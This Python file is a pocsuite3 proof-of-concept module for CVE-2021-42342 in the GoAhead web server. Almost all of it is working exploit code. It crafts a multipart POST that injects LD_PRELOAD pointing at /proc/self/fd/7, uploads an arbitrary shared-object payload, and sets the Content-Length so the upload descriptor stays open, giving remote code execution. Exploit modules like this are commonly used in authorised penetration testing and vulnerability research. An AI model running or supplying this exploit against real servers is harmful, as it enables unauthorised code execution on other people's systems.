"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""

# import base64
from collections import OrderedDict

from pocsuite3.api import Output
from pocsuite3.api import POCBase
from pocsuite3.api import OptDict
# from pocsuite3.api import logger
from pocsuite3.api import requests
from pocsuite3.api import OptString
from pocsuite3.api import register_poc
from pocsuite3.api import POC_CATEGORY
from pocsuite3.api import REVERSE_PAYLOAD


class DemoPOC(POCBase):
	vulID = '99427'  # ssvid
	version = '1.0'
	author = ['lalone']
	vulDate = '2022-02-15'
	createDate = '2022-02-15'
	updateDate = '2022-02-15'
	references = ['https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2021-42342']
	name = 'GoAhead Server 环境变量注入（CVE-2021-42342）'
	appPowerLink = 'https://www.embedthis.com/goahead/'
	appName = 'GoAhead'
	appVersion = 'GoAhead web-server = 4.x、5.x <= GoAhead web-server < 5.1.5'
	vulType = 'code-exec'
	desc = '''
		GoAhead存在RCE漏洞，漏洞源于文件上传过滤器处理的不全，当与CGI处理程序一起使用时，可影响环境变量，从而实现RCE。
	'''
	samples = ['http://10.10.50.4:8080']
	install_requires = []
	category = POC_CATEGORY.EXPLOITS.WEBAPP

	def _options(self):
		o = OrderedDict()
		o["payload"] = OptString(r'pocs\CVE-2021-42342_payload.so', description='需要用户输入payload的路径', require=True)
		return o

	def _check(self):
		with open(self.get_option("payload"), 'rb') as f:
			data = f.read()
		content_length = str(min(len(data) + 500, 16384 - 200))

		headers = url_headers()
		url = self.url.rstrip('/')
		payload = url_data(data)

		s = requests.Session()
		p = requests.Request('POST', url, headers=headers, data=payload).prepare()
		p.headers['Content-Length'] = content_length
		resp = s.send(p)

		return resp

	def _verify(self):
		result = {}
		resp = self._check()
		
		if resp.status_code == 200 and "'hello': 'World'" in str(resp.headers):
			result['VerifyInfo'] = {}
			result['VerifyInfo']['URL'] = self.url
			result['VerifyInfo']['payload'] = self.get_option("payload")

		return self.parse_output(result)

	def _attack(self):
		result = {}
		resp = self._check()
		
		if resp.status_code == 200:
			result['VerifyInfo'] = {}
			result['VerifyInfo']['URL'] = self.url
			result['VerifyInfo']['payload'] = self.get_option("payload")

		return self.parse_output(result)

	def parse_output(self, result):
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('target is not vulnerable')
		return output

def url_headers():
	headers = {
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0',
		'Accept': '*/*',
		'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
		'Content-Type': 'application/x-www-form-urlencoded',
		'Accept-Encoding': 'gzip, deflate',
		'Connection': 'close',
		'Accept-Language': 'en',
		'Content-Type': 'multipart/form-data; boundary=----1253289664816'
	}
	return headers

def url_data(payload):
	padding = 'a' * 2000
	data = fr'''------1253289664816
Content-Disposition: form-data; name="LD_PRELOAD";

/proc/self/fd/7
------1253289664816
Content-Disposition: form-data; name="data"; filename="1.txt"
Content-Type: text/plain

#payload#{padding}
------1253289664816--
'''.replace('\n', '\r\n')
	data = data.encode().replace(b'#payload#', payload)
	return data

register_poc(DemoPOC)